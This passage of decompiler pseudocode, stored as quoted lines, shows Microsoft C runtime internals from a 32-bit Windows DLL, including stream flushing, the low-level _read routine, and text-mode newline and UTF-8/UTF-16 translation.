    "  FILE **v7; // ecx",
    "  FILE **v8; // eax",
    "  FILE **v10[5]; // [esp+10h] [ebp-3Ch] BYREF",
    "  FILE *v11; // [esp+24h] [ebp-28h] BYREF",
    "  FILE *v12; // [esp+28h] [ebp-24h] BYREF",
    "  FILE *v13; // [esp+2Ch] [ebp-20h] BYREF",
    "  CPPEH_RECORD ms_exc; // [esp+34h] [ebp-18h]",
    "",
    "  __acrt_lock(*a1);",
    "  ms_exc.registration.TryLevel = 0;",
    "  v3 = (FILE **)Block;",
    "  v4 = (FILE **)((char *)Block + 4 * dword_10040214);",
    "  v5 = a2;",
    "  while ( 1 )",
    "  {",
    "    v10[4] = v3;",
    "    if ( v3 == v4 )",
    "      break;",
    "    v13 = *v3;",
    "    if ( (unsigned __int8)common_flush_all_should_try_to_flush_stream(v13, *v5) )",
    "    {",
    "      v6 = v5[2];",
    "      v7 = v5[1];",
    "      v8 = *v5;",
    "      v10[0] = &v13;",
    "      v10[1] = v8;",
    "      v10[2] = v7;",
    "      v10[3] = v6;",
    "      v12 = v13;",
    "      v11 = v13;",
    "      __crt_seh_guarded_call<void>::operator()<_lambda_2866be3712abc81a800a822484c830d8_,_lambda_39ca0ed439415581b5b15c265174cece_ &,_lambda_2b24c74d71094a6cd0cb82e44167d71b_>(",
    "        &v11,",
    "        v10,",
    "        &v12);",
    "      v5 = a2;",
    "    }",
    "    ++v3;",
    "  }",
    "  ms_exc.registration.TryLevel = -2;",
    "  return __acrt_unlock(*a3);",
    "}",
    "",
    "",
    "int __cdecl sub_100227B6(char a1)",
    "{",
    "  int result; // eax",
    "  FILE **v2[3]; // [esp+0h] [ebp-20h] BYREF",
    "  int v3; // [esp+Ch] [ebp-14h] BYREF",
    "  int v4; // [esp+10h] [ebp-10h] BYREF",
    "  int v5; // [esp+14h] [ebp-Ch] BYREF",
    "  int v6; // [esp+18h] [ebp-8h] BYREF",
    "",
    "  v5 = 0;",
    "  v6 = 0;",
    "  v2[0] = (FILE **)&v5;",
    "  v2[1] = (FILE **)&a1;",
    "  v2[2] = (FILE **)&v6;",
    "  v4 = 8;",
    "  v3 = 8;",
    "  __crt_seh_guarded_call<void>::operator()<_lambda_2cc53f568c5a2bb6f192f930a45d44ea_,_lambda_ab61a845afdef5b7c387490eaf3616ee_ &,_lambda_c2ffc0b7726aa6be21d5f0026187e748_>(",
    "    &v3,",
    "    v2,",
    "    &v4);",
    "  result = v6;",
    "  if ( a1 )",
    "    return v5;",
    "  return result;",
    "}",
    "",
    "",
    "char __cdecl common_flush_all_should_try_to_flush_stream(int a1, _DWORD *a2)",
    "{",
    "  if ( !a1 || (*(_DWORD *)(a1 + 12) & 0x2000) == 0 )",
    "    return 0;",
    "  if ( !is_stream_flushable_or_commitable(*(_DWORD *)(a1 + 12)) )",
    "  {",
    "    ++*a2;",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "bool __cdecl is_stream_flushable_or_commitable(__int16 a1)",
    "{",
    "  return (a1 & 3) == 2 && (a1 & 0xC0) != 0 || (a1 & 0x800) != 0;",
    "}",
    "",
    "",
    "int __cdecl __acrt_stdio_flush_nolock(FILE *Stream, __crt_cached_ptd_host *a2)",
    "{",
    "  int *p_flag; // esi",
    "  int flag; // edx",
    "  int cnt; // ebx",
    "  char *v5; // edi",
    "  int v6; // eax",
    "",
    "  p_flag = &Stream->_flag;",
    "  flag = Stream->_flag;",
    "  if ( (flag & 3) == 2 && (flag & 0xC0) != 0 )",
    "  {",
    "    cnt = Stream->_cnt;",
    "    v5 = &Stream->_ptr[-cnt];",
    "    Stream->_ptr = (char *)cnt;",
    "    Stream->_base = 0;",
    "    if ( (int)v5 > 0 )",
    "    {",
    "      v6 = _fileno(Stream);",
    "      if ( v5 != (char *)_write_internal(v6, cnt, (int)v5, a2) )",
    "      {",
    "        _InterlockedOr(p_flag, 0x10u);",
    "        return -1;",
    "      }",
    "      if ( (*p_flag & 4) != 0 )",
    "        _InterlockedAnd(p_flag, 0xFFFFFFFD);",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl _fflush_nolock(FILE *Stream)",
    "{",
    "  int v1; // esi",
    "  int v2; // eax",
    "  int v4[10]; // [esp+8h] [ebp-28h] BYREF",
    "",
    "  v1 = 0;",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v4, 0);",
    "  if ( Stream )",
    "  {",
    "    if ( __acrt_stdio_flush_nolock(Stream, (__crt_cached_ptd_host *)v4)",
    "      || (Stream->_flag & 0x800) != 0 && (v2 = _fileno(Stream), _commit(v2)) )",
    "    {",
    "      v1 = -1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v1 = sub_100227B6(0);",
    "  }",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v4);",
    "  return v1;",
    "}",
    "",
    "",
    "int sub_10022924()",
    "{",
    "  return sub_100227B6(1);",
    "}",
    "",
    "",
    "int __cdecl sub_1002292D(int FileHandle, char *a2, int a3)",
    "{",
    "  int v3; // edx",
    "  char *v4; // ebx",
    "  int v5; // edi",
    "  LPCRITICAL_SECTION v6; // eax",
    "  char *v7; // eax",
    "  char *v8; // esi",
    "  char v9; // cl",
    "  char v10; // cl",
    "  int v11; // eax",
    "  int v12; // edx",
    "  LPCRITICAL_SECTION v13; // edi",
    "  char v14; // al",
    "  int v16; // [esp+Ch] [ebp-18h]",
    "  HANDLE hFile; // [esp+10h] [ebp-14h]",
    "  DWORD NumberOfBytesRead; // [esp+14h] [ebp-10h] BYREF",
    "  int v19; // [esp+18h] [ebp-Ch]",
    "  char *v20; // [esp+1Ch] [ebp-8h]",
    "  char Buffer; // [esp+23h] [ebp-1h] BYREF",
    "",
    "  v3 = FileHandle;",
    "  v4 = a2;",
    "  v5 = 56 * (FileHandle & 0x3F);",
    "  v6 = lpCriticalSection[FileHandle >> 6];",
    "  v16 = FileHandle >> 6;",
    "  hFile = *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v6[1].DebugInfo + v5);",
    "  if ( a3 && *a2 == 10 )",
    "    *((_BYTE *)&v6[1].LockSemaphore + v5) |= 4u;",
    "  else",
    "    *((_BYTE *)&v6[1].LockSemaphore + v5) &= ~4u;",
    "  v7 = a2;",
    "  NumberOfBytesRead = (DWORD)&a2[a3];",
    "  v8 = a2;",
    "  if ( a2 >= &a2[a3] )",
    "    return v8 - v4;",
    "  while ( 1 )",
    "  {",
    "    v9 = *v7;",
    "    if ( *v7 == 26 )",
    "    {",
    "      v11 = v3 >> 6;",
    "      v12 = 56 * (v3 & 0x3F);",
    "      v13 = lpCriticalSection[v11];",
    "      v14 = *((_BYTE *)&v13[1].LockSemaphore + v12);",
    "      if ( (v14 & 0x40) == 0 )",
    "      {",
    "        *((_BYTE *)&v13[1].LockSemaphore + v12) = v14 | 2;",
    "        return v8 - v4;",
    "      }",
    "      *v8 = 26;",
    "      return ++v8 - v4;",
    "    }",
    "    v20 = v7 + 1;",
    "    v4 = a2;",
    "    if ( v9 == 13 )",
    "      break;",
    "    v7 = v20;",
    "LABEL_14:",
    "    *v8 = v9;",
    "    v19 = 1;",
    "    v20 = v8++;",
    "    if ( (unsigned int)v7 >= NumberOfBytesRead )",
    "      return v8 - v4;",
    "  }",
    "  v3 = FileHandle;",
    "  if ( (unsigned int)v20 < NumberOfBytesRead )",
    "  {",
    "    if ( *v20 == 10 )",
    "    {",
    "      v7 += 2;",
    "      v9 = 10;",
    "    }",
    "    else",
    "    {",
    "      v7 = v20;",
    "    }",
    "    v4 = a2;",
    "    goto LABEL_14;",
    "  }",
    "  if ( !ReadFile(hFile, &Buffer, 1u, &NumberOfBytesRead, 0) || !NumberOfBytesRead )",
    "  {",
    "LABEL_25:",
    "    *v8 = 13;",
    "    return ++v8 - v4;",
    "  }",
    "  if ( (*((_BYTE *)&lpCriticalSection[v16][1].LockSemaphore + v5) & 0x48) == 0 )",
    "  {",
    "    if ( Buffer == 10 && v8 == a2 )",
    "      goto LABEL_20;",
    "    _lseeki64_nolock(FileHandle, (LARGE_INTEGER)-1LL, 1u);",
    "    if ( Buffer == 10 )",
    "      return v8 - v4;",
    "    goto LABEL_25;",
    "  }",
    "  v10 = Buffer;",
    "  if ( Buffer == 10 )",
    "  {",
    "LABEL_20:",
    "    *v8 = 10;",
    "    return ++v8 - v4;",
    "  }",
    "  *v8 = 13;",
    "  *((_BYTE *)&lpCriticalSection[v16][1].LockSemaphore + v5 + 2) = v10;",
    "  return ++v8 - v4;",
    "}",
    "",
    "",
    "unsigned int __cdecl sub_10022A80(int FileHandle, __int16 *a2, int a3)",
    "{",
    "  char *v3; // ebx",
    "  int v4; // edi",
    "  LPCRITICAL_SECTION v5; // eax",
    "  __int16 *v6; // eax",
    "  __int16 *v7; // esi",
    "  int v8; // edx",
    "  __int16 *v9; // edx",
    "  unsigned __int16 v10; // dx",
    "  __int16 v11; // ax",
    "  unsigned __int16 v12; // dx",
    "  int v13; // ecx",
    "  int v14; // edx",
    "  int v15; // ecx",
    "  LPCRITICAL_SECTION v16; // edi",
    "  char v17; // al",
    "  HANDLE hFile; // [esp+Ch] [ebp-18h]",
    "  DWORD NumberOfBytesRead; // [esp+10h] [ebp-14h] BYREF",
    "  unsigned int v21; // [esp+14h] [ebp-10h]",
    "  int v22; // [esp+18h] [ebp-Ch]",
    "  int v23; // [esp+1Ch] [ebp-8h]",
    "  unsigned int Buffer; // [esp+20h] [ebp-4h] BYREF",
    "",
    "  v3 = (char *)a2;",
    "  v4 = 56 * (FileHandle & 0x3F);",
    "  v5 = lpCriticalSection[FileHandle >> 6];",
    "  v23 = FileHandle >> 6;",
    "  hFile = *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v5[1].DebugInfo + v4);",
    "  if ( a3 && *a2 == 10 )",
    "    *((_BYTE *)&v5[1].LockSemaphore + v4) |= 4u;",
    "  else",
    "    *((_BYTE *)&v5[1].LockSemaphore + v4) &= ~4u;",
    "  v6 = a2;",
    "  v21 = (unsigned int)&a2[a3];",
    "  v7 = a2;",
    "  if ( (unsigned int)a2 >= v21 )",
    "    return ((char *)v7 - v3) & 0xFFFFFFFE;",
    "  while ( 1 )",
    "  {",
    "    v8 = (unsigned __int16)*v6;",
    "    v22 = v8;",
    "    NumberOfBytesRead = (unsigned __int16)v8;",
    "    if ( v8 == 26 )",
    "    {",
    "      v15 = 56 * (FileHandle & 0x3F);",
    "      v16 = lpCriticalSection[FileHandle >> 6];",
    "      v17 = *((_BYTE *)&v16[1].LockSemaphore + v15);",
    "      if ( (v17 & 0x40) == 0 )",
    "      {",
    "        *((_BYTE *)&v16[1].LockSemaphore + v15) = v17 | 2;",
    "        return ((char *)v7 - v3) & 0xFFFFFFFE;",
    "      }",
    "      *v7 = 26;",
    "      return ((char *)++v7 - v3) & 0xFFFFFFFE;",
    "    }",
    "    Buffer = (unsigned int)(v6 + 1);",
    "    v3 = (char *)a2;",
    "    if ( (_WORD)v8 == 13 )",
    "      break;",
    "    v9 = v7;",
    "    v6 = (__int16 *)Buffer;",
    "    Buffer = (unsigned __int16)NumberOfBytesRead;",
    "LABEL_14:",
    "    v3 = (char *)a2;",
    "    v22 = 2;",
    "    *v7 = Buffer;",
    "    v7 = (__int16 *)((char *)v9 + v22);",
    "    if ( (unsigned int)v6 >= v21 )",
    "      return ((char *)v7 - v3) & 0xFFFFFFFE;",
    "  }",
    "  if ( Buffer < v21 )",
    "  {",
    "    if ( *(_WORD *)Buffer == 10 )",
    "    {",
    "      v6 += 2;",
    "      v10 = 10;",
    "    }",
    "    else",
    "    {",
    "      v6 = (__int16 *)Buffer;",
    "      v10 = v22;",
    "    }",
    "    Buffer = v10;",
    "    v9 = v7;",
    "    NumberOfBytesRead = (DWORD)v7;",
    "    goto LABEL_14;",
    "  }",
    "  if ( !ReadFile(hFile, &Buffer, 2u, &NumberOfBytesRead, 0) || !NumberOfBytesRead )",
    "  {",
    "LABEL_25:",
    "    v11 = 13;",
    "    goto LABEL_20;",
    "  }",
    "  v11 = 10;",
    "  if ( (*((_BYTE *)&lpCriticalSection[v23][1].LockSemaphore + v4) & 0x48) == 0 )",
    "  {",
    "    if ( (_WORD)Buffer == 10 && v7 == a2 )",
    "      goto LABEL_20;",
    "    _lseeki64_nolock(FileHandle, (LARGE_INTEGER)-2LL, 1u);",
    "    if ( (_WORD)Buffer == 10 )",
    "      return ((char *)v7 - v3) & 0xFFFFFFFE;",
    "    goto LABEL_25;",
    "  }",
    "  v12 = Buffer;",
    "  if ( (_WORD)Buffer == 10 )",
    "  {",
    "LABEL_20:",
    "    *v7 = v11;",
    "    return ((char *)++v7 - v3) & 0xFFFFFFFE;",
    "  }",
    "  *v7 = 13;",
    "  v13 = HIBYTE(v12);",
    "  *((_BYTE *)&lpCriticalSection[v23][1].LockSemaphore + v4 + 2) = v12;",
    "  v14 = v23;",
    "  *((_BYTE *)&lpCriticalSection[v23][1].LockSemaphore + v4 + 3) = v13;",
    "  *((_BYTE *)&lpCriticalSection[v14][1].SpinCount + v4) = 10;",
    "  return ((char *)++v7 - v3) & 0xFFFFFFFE;",
    "}",
    "",
    "",
    "int __cdecl translate_ansi_or_utf8_nolock(",
    "        int FileHandle,",
    "        char *lpMultiByteStr,",
    "        unsigned int a3,",
    "        LPWSTR lpWideCharStr,",
    "        unsigned int cchWideChar)",
    "{",
    "  int result; // eax",
    "  int v6; // ecx",
    "  int v7; // edi",
    "  const CHAR *v8; // eax",
    "  const CHAR *v9; // esi",
    "  int v10; // eax",
    "  unsigned int i; // edx",
    "  char v12; // cl",
    "  char *v13; // esi",
    "  char v14; // cl",
    "  char v15; // cl",
    "  int v16; // esi",
    "  int v17; // eax",
    "  DWORD LastError; // eax",
    "  LPCRITICAL_SECTION v19; // edx",
    "  char v20; // cl",
    "  LPCRITICAL_SECTION v21; // [esp+4h] [ebp-8h]",
    "  int v22; // [esp+8h] [ebp-4h]",
    "",
    "  result = sub_1002292D(FileHandle, lpMultiByteStr, a3);",
    "  v6 = result;",
    "  if ( result )",
    "  {",
    "    v7 = 56 * (FileHandle & 0x3F);",
    "    v22 = FileHandle >> 6;",
    "    v21 = lpCriticalSection[FileHandle >> 6];",
    "    if ( *((_BYTE *)&v21[1].LockSemaphore + v7 + 1) )",
    "    {",
    "      v8 = &lpMultiByteStr[result];",
    "      v9 = &lpMultiByteStr[v6 - 1];",
    "      if ( *v9 < 0 )",
    "      {",
    "        v10 = *(unsigned __int8 *)v9;",
    "        for ( i = 1; !byte_1003F2A8[v10] && i <= 4 && v9 >= lpMultiByteStr; ++i )",
    "          v10 = *(unsigned __int8 *)--v9;",
    "        v12 = *v9;",
    "        if ( !byte_1003F2A8[*(unsigned __int8 *)v9] )",
    "        {",
    "          *(_DWORD *)sub_1001E025() = 42;",
    "          return -1;",
    "        }",
    "        if ( byte_1003F2A8[*(unsigned __int8 *)v9] + 1 == i )",
    "        {",
    "          v9 += i;",
    "        }",
    "        else if ( (*((_BYTE *)&v21[1].LockSemaphore + v7) & 0x48) != 0 )",
    "        {",
    "          v13 = (char *)(v9 + 1);",
    "          *((_BYTE *)&v21[1].LockSemaphore + v7 + 2) = v12;",
    "          if ( i >= 2 )",
    "          {",
    "            v14 = *v13++;",
    "            *((_BYTE *)&lpCriticalSection[v22][1].LockSemaphore + v7 + 3) = v14;",
    "          }",
    "          if ( i == 3 )",
    "          {",
    "            v15 = *v13++;",
    "            *((_BYTE *)&lpCriticalSection[v22][1].SpinCount + v7) = v15;",
    "          }",
    "          v9 = &v13[-i];",
    "        }",
    "        else",
    "        {",
    "          _lseeki64_nolock(FileHandle, (LARGE_INTEGER)-i, 1u);",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v9 = v8;",
    "      }",
    "      v16 = v9 - lpMultiByteStr;",
    "      v17 = __acrt_MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, v16, lpWideCharStr, cchWideChar);",
    "      if ( !v17 )",
    "      {",
    "        LastError = GetLastError();",
    "        __acrt_errno_map_os_error(LastError);",
    "        return -1;",
    "      }",
    "      v19 = lpCriticalSection[v22];",
    "      v20 = *((_BYTE *)&v19[1].SpinCount + v7 + 1) & 0xFD | (v17 == v16 ? 0 : 2);",
    "      result = 2 * v17;",
    "      *((_BYTE *)&v19[1].SpinCount + v7 + 1) = v20;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "unsigned int __cdecl sub_10022D97(int a1, char *a2, int a3)",
    "{",
    "  char *v3; // edi",
    "  unsigned __int16 *v4; // ecx",
    "  char *v5; // esi",
    "  unsigned int v6; // edx",
    "  int v7; // eax",
    "  int v9; // [esp-8h] [ebp-14h]",
    "",
    "  v3 = a2;",
    "  v4 = (unsigned __int16 *)a2;",
    "  v5 = a2;",
    "  v6 = (unsigned int)&a2[2 * a3];",
    "  if ( (unsigned int)a2 < v6 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v7 = *v4;",
    "      if ( v7 == 26 )",
    "        break;",
    "      if ( v7 == 13 && (unsigned int)(v4 + 1) < v6 && v4[1] == 10 )",
    "      {",
    "        LOWORD(v7) = 10;",
    "        v9 = 4;",
    "      }",
    "      else",
    "      {",
    "        v9 = 2;",
    "      }",
    "      *(_WORD *)v5 = v7;",
    "      v4 = (unsigned __int16 *)((char *)v4 + v9);",
    "      v3 = a2;",
    "      v5 += 2;",
    "      if ( (unsigned int)v4 >= v6 )",
    "        return (v5 - v3) & 0xFFFFFFFE;",
    "    }",
    "    *((_BYTE *)&lpCriticalSection[a1 >> 6][1].LockSemaphore + 56 * (a1 & 0x3F)) |= 2u;",
    "  }",
    "  return (v5 - v3) & 0xFFFFFFFE;",
    "}",
    "",
    "",
    "int __cdecl _read(int FileHandle, void *DstBuf, unsigned int MaxCharCount)",
    "{",
    "  BOOL v4; // eax",
    "  int v5; // ebx",
    "  int v6; // [esp+10h] [ebp-24h]",
    "",
    "  if ( FileHandle == -2 )",
    "  {",
    "    *(_DWORD *)sub_1001E010() = 0;",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "    return -1;",
    "  }",
    "  v4 = FileHandle >= 0 && FileHandle < (unsigned int)dword_10040590;",
    "  if ( !v4",
    "    || (v6 = 56 * (FileHandle & 0x3F), (*((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + v6) & 1) == 0) )",
    "  {",
    "    *(_DWORD *)sub_1001E010() = 0;",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "LABEL_10:",
    "    _invalid_parameter_noinfo();",
    "    return -1;",
    "  }",
    "  if ( MaxCharCount > 0x7FFFFFFF )",
    "  {",
    "    *(_DWORD *)sub_1001E010() = 0;",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    goto LABEL_10;",
    "  }",
    "  __acrt_lowio_lock_fh(FileHandle);",
    "  v5 = -1;",
    "  if ( (*((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + v6) & 1) != 0 )",
    "  {",
    "    v5 = sub_10022F2D(FileHandle, (LPWSTR)DstBuf, MaxCharCount);",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 9;",
    "    *(_DWORD *)sub_1001E010() = 0;",
    "  }",
    "  __acrt_lowio_unlock_fh(FileHandle);",
    "  return v5;",
    "}",
    "",
    "",
    "unsigned int __cdecl sub_10022F2D(unsigned int FileHandle, LPWSTR lpWideCharStr, DWORD nNumberOfBytesToRead)",
    "{",
    "  int v3; // edi",
    "  LPCRITICAL_SECTION v4; // eax",
    "  void *v5; // esi",
    "  void *v6; // esi",
    "  DWORD v7; // ebx",
    "  LPWSTR v8; // edx",
    "  DWORD v9; // eax",
    "  LPCRITICAL_SECTION v10; // ecx",
    "  void *v11; // edx",
    "  int v12; // edi",
    "  int v13; // ecx",
    "  char v14; // al",
    "  char *v15; // edx",
    "  int v16; // ecx",
    "  _BYTE *v17; // edx",
    "  bool v18; // zf",
    "  char v19; // al",
    "  int v20; // ecx",
    "  _BYTE *v21; // edx",
    "  char v22; // al",
    "  char *v23; // ebx",
    "  DWORD LastError; // eax",
    "  unsigned int v25; // edi",
    "  DWORD v27; // ecx",
    "  unsigned int v28; // eax",
    "  DWORD v29; // [esp-10h] [ebp-3Ch]",
    "  DWORD v30; // [esp-10h] [ebp-3Ch]",
    "  int v31; // [esp-8h] [ebp-34h]",
    "  DWORD Mode; // [esp+8h] [ebp-24h] BYREF",
    "  int v33; // [esp+Ch] [ebp-20h]",
    "  int v34; // [esp+10h] [ebp-1Ch]",
    "  DWORD NumberOfCharsRead; // [esp+14h] [ebp-18h] BYREF",
    "  HANDLE hConsoleHandle; // [esp+18h] [ebp-14h]",
    "  int v37; // [esp+1Ch] [ebp-10h]",
    "  LPVOID lpBuffer; // [esp+20h] [ebp-Ch]",
    "  unsigned int v39; // [esp+24h] [ebp-8h]",
    "  char v40; // [esp+2Bh] [ebp-1h]",
    "",
    "  if ( FileHandle != -2 )",
    "  {",
    "    if ( (FileHandle & 0x80000000) == 0",
    "      && FileHandle < dword_10040590",
    "      && (v3 = 56 * (FileHandle & 0x3F),",
    "          v39 = FileHandle >> 6,",
    "          v34 = 1,",
    "          v4 = lpCriticalSection[FileHandle >> 6],",
    "          v37 = v3,",
    "          v40 = *((_BYTE *)&v4[1].LockSemaphore + v3),",
    "          (v40 & 1) != 0) )",
    "    {",
    "      if ( nNumberOfBytesToRead <= 0x7FFFFFFF )",
    "      {",
    "        if ( !nNumberOfBytesToRead || (v40 & 2) != 0 )",
    "          return 0;",
    "        if ( lpWideCharStr )",
    "        {",
    "          v5 = *(PRTL_CRITICAL_SECTION_DEBUG *)((char *)&v4[1].DebugInfo + v3);",
    "          v40 = *((_BYTE *)&v4[1].LockSemaphore + v3 + 1);",
    "          hConsoleHandle = v5;",
    "          v6 = 0;",
    "          if ( v40 == 1 )",
    "          {",
    "            if ( (nNumberOfBytesToRead & 1) != 0 )",
    "            {",
    "LABEL_14:",
    "              *(_DWORD *)sub_1001E010() = 0;",
    "              *(_DWORD *)sub_1001E025() = 22;",
    "              _invalid_parameter_noinfo();",
    "LABEL_39:",
    "              v25 = -1;",
    "LABEL_40:",
    "              _free_base(v6);",
    "              return v25;",
    "            }",
    "            v7 = nNumberOfBytesToRead >> 1;",
    "            if ( nNumberOfBytesToRead >> 1 < 4 )",
    "              v7 = 4;",
    "            v6 = sub_100202D0(v7);",
    "            _free_base(0);",
    "            _free_base(0);",
    "            lpBuffer = v6;",
    "            if ( !v6 )",
    "            {",
    "              *(_DWORD *)sub_1001E025() = 12;",
    "              *(_DWORD *)sub_1001E010() = 8;",
    "              goto LABEL_39;",
    "            }",
    "            v9 = _lseeki64_nolock(FileHandle, 0, 1u);",
    "            v10 = lpCriticalSection[v39];",
    "            *(LONG *)((char *)&v10[1].RecursionCount + v3) = v9;",
    "            *(HANDLE *)((char *)&v10[1].OwningThread + v3) = v11;",
    "            v8 = (LPWSTR)v6;",
    "          }",
    "          else",
    "          {",
    "            if ( v40 == 2 && (nNumberOfBytesToRead & 1) != 0 )",
    "              goto LABEL_14;",
    "            v7 = nNumberOfBytesToRead;",
    "            v8 = lpWideCharStr;",
    "            lpBuffer = lpWideCharStr;",
    "          }",
    "          v12 = 0;",
    "          v33 = (int)v8;",
    "          NumberOfCharsRead = (DWORD)lpCriticalSection[v39];",
    "          v13 = FileHandle;",
    "          if ( (*(_BYTE *)(v37 + NumberOfCharsRead + 40) & 0x48) != 0 )",
    "          {",
    "            v14 = *(_BYTE *)(v37 + NumberOfCharsRead + 42);",
    "            v15 = (char *)lpBuffer;",
    "            if ( v14 != 10 )",
    "            {",
    "              if ( v7 )",
    "              {",
    "                v16 = v37;",
    "                v12 = 1;",
    "                *(_BYTE *)lpBuffer = v14;",
    "                v17 = v15 + 1;",
    "                --v7;",
    "                v18 = v40 == 0;",
    "                lpBuffer = v17;",
    "                *((_BYTE *)&lpCriticalSection[v39][1].LockSemaphore + v16 + 2) = 10;",
    "                v13 = FileHandle;",
    "                if ( !v18 )",
    "                {",
    "                  v19 = *((_BYTE *)&lpCriticalSection[v39][1].LockSemaphore + v37 + 3);",
    "                  v13 = FileHandle;",
    "                  if ( v19 != 10 )",
    "                  {",
    "                    if ( v7 )",
    "                    {",
    "                      v20 = v37;",
    "                      *v17 = v19;",
    "                      v21 = v17 + 1;",
    "                      --v7;",
    "                      v18 = v40 == 1;",
    "                      lpBuffer = v21;",
    "                      v12 = 2;",
    "                      *((_BYTE *)&lpCriticalSection[v39][1].LockSemaphore + v20 + 3) = 10;",
    "                      v13 = FileHandle;",
    "                      if ( v18 )",
    "                      {",
    "                        v22 = *((_BYTE *)&lpCriticalSection[v39][1].SpinCount + v37);",
    "                        v13 = FileHandle;",
    "                        if ( v22 != 10 )",
    "                        {",
    "                          if ( v7 )",
    "                          {",
    "                            *v21 = v22;",
    "                            --v7;",
    "                            lpBuffer = v21 + 1;",
    "                            v12 = 3;",
    "                            *((_BYTE *)&lpCriticalSection[v39][1].SpinCount + v37) = 10;",
    "                          }",
    "                        }",
    "                      }",
    "                    }",
    "                  }",
    "                }",
    "              }",
    "            }",
    "          }",
    "          if ( _isatty(v13)",
    "            && *((char *)&lpCriticalSection[v39][1].LockSemaphore + v37) < 0",
    "            && GetConsoleMode(hConsoleHandle, &Mode) )",
    "          {",
    "            if ( v40 == 2 )",
    "            {",
    "              v29 = v7 >> 1;",
    "              v23 = (char *)lpBuffer;",
    "              if ( !ReadConsoleW(hConsoleHandle, lpBuffer, v29, &NumberOfCharsRead, 0) )",
    "              {",
    "                LastError = GetLastError();",
    "LABEL_38:",
    "                __acrt_errno_map_os_error(LastError);",
    "                goto LABEL_39;",
    "              }",
    "              v27 = nNumberOfBytesToRead;",
    "              v25 = v12 + 2 * NumberOfCharsRead;",
    "              goto LABEL_46;",
    "            }",
    "          }",
    "          else",
    "          {",
    "            LOBYTE(v34) = 0;",
    "          }",
    "          v30 = v7;",
    "          v23 = (char *)lpBuffer;",
    "          if ( !ReadFile(hConsoleHandle, lpBuffer, v30, &NumberOfCharsRead, 0)",
    "            || (v27 = nNumberOfBytesToRead, NumberOfCharsRead > nNumberOfBytesToRead) )",
    "          {",
    "            LastError = GetLastError();",
    "            if ( LastError == 5 )",
    "            {",
    "              *(_DWORD *)sub_1001E025() = 9;",
    "              *(_DWORD *)sub_1001E010() = 5;",
    "              goto LABEL_39;",
    "            }",
    "            if ( LastError == 109 )",
    "            {",
    "              v25 = 0;",
    "              goto LABEL_40;",
    "            }",
    "            goto LABEL_38;",
    "          }",
    "          v25 = NumberOfCharsRead + v12;",
    "LABEL_46:",
    "          if ( *((char *)&lpCriticalSection[v39][1].LockSemaphore + v37) < 0 )",
    "          {",
    "            if ( v40 == 2 )",
    "            {",
    "              v31 = v25 >> 1;",
    "              if ( (_BYTE)v34 )",
    "                v28 = sub_10022D97(FileHandle, (char *)v33, v31);",
    "              else",
    "                v28 = sub_10022A80(FileHandle, (__int16 *)v33, v31);",
    "            }",
    "            else",
    "            {",
    "              v28 = translate_ansi_or_utf8_nolock(FileHandle, v23, v25, lpWideCharStr, v27 >> 1);",
    "            }",
    "            v25 = v28;",
    "          }",
    "          goto LABEL_40;",
    "        }",
    "      }",
    "      *(_DWORD *)sub_1001E010() = 0;",
    "      *(_DWORD *)sub_1001E025() = 22;",
    "    }",
    "    else",
    "    {",
    "      *(_DWORD *)sub_1001E010() = 0;",
    "      *(_DWORD *)sub_1001E025() = 9;",
    "    }",
    "    _invalid_parameter_noinfo();",
    "    return -1;",
    "  }",
    "  *(_DWORD *)sub_1001E010() = 0;",
    "  *(_DWORD *)sub_1001E025() = 9;",
    "  return -1;",
    "}",
    "",
    "",
    "int __cdecl sub_100232B9(FILE *Stream)",
    "{",
    "  unsigned int bufsiz; // esi",
    "  void *cnt; // edi",
    "  int v4; // eax",
    "  char *base; // edx",
    "  int v6; // edi",
    "  char *v7; // eax",
    "  FILE *v8; // eax",
    "  char *ptr; // ecx",
    "  unsigned __int8 v10; // dl",
    "  unsigned int v11; // ecx",
    "",
    "  if ( !Stream )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return -1;",
    "  }",
    "  if ( (Stream->_flag & 0x2000) == 0 || (Stream->_flag & 0x1000) != 0 )",
    "    return -1;",
    "  if ( (Stream->_flag & 2) != 0 )",
    "  {",
    "    _InterlockedOr(&Stream->_flag, 0x10u);",
    "    return -1;",
    "  }",
    "  _InterlockedOr(&Stream->_flag, 1u);",
    "  if ( (Stream->_flag & 0x4C0) == 0 )",
    "    __acrt_stdio_allocate_buffer_nolock(Stream);",
    "  Stream->_ptr = (char *)Stream->_cnt;",
    "  bufsiz = Stream->_bufsiz;",
    "  cnt = (void *)Stream->_cnt;",
    "  v4 = _fileno(Stream);",
    "  Stream->_base = (char *)_read(v4, cnt, bufsiz);",
    "  base = Stream->_base;",
    "  if ( !base || base == (char *)-1 )",
    "  {",
    "    v11 = 8;",
    "    if ( base )",
    "      v11 = 16;",
    "    _InterlockedOr(&Stream->_flag, v11);",
    "    Stream->_base = 0;",
    "    return -1;",
    "  }",
    "  if ( (Stream->_flag & 6) == 0 )",
    "  {",
    "    if ( _fileno(Stream) == -1 || _fileno(Stream) == -2 )",
    "    {",
    "      v7 = (char *)&unk_1003F270;",
    "    }",
    "    else",
    "    {",
    "      v6 = _fileno(Stream) >> 6;",
    "      v7 = (char *)lpCriticalSection[v6] + 56 * (_fileno(Stream) & 0x3F);",
    "    }",
    "    if ( (v7[40] & 0x82) == 0x82 )",
    "      _InterlockedOr(&Stream->_flag, 0x20u);",
    "  }",
    "  v8 = Stream;",
    "  if ( Stream->_bufsiz == 512 )",
